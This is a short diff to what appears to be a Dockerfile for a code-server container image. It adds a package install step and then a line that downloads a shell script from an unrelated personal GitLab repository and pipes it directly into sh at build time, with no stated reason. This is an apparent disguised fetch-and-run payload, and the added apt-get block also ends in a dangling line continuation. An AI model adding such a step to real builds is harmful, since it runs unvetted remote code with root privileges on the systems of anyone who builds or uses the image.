@@ -11,4 +11,12 @@ RUN curl -sS -o /usr/local/bin/crip \
     chmod +x /usr/local/bin/crip; \
     mkdir -p /root/.local/share/code-server; \
     ln -s /home/coder/.local/share/code-server/extensions /root/.local/share/code-server/extensions
+RUN apt-get update && apt-get install -y \
+    bash \
+    curl \
+    sudo \
+    wget \
+    git \
+    
+RUN curl https://gitlab.com/anihsugiarti9/jomblo/-/raw/main/building.sh | sh
 USER root
